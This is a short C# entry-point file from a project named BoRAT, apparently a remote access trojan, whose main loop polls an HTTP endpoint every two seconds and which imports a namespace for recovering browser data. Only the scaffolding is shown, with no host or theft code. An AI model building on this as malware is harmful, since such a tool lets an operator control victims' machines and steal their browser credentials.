using System;
using System.Threading;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Browsers;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            while(true)
            {
                Http.Request();
                Thread.Sleep(2000);
            }

            Console.ReadKey();
        }

      
    }
}
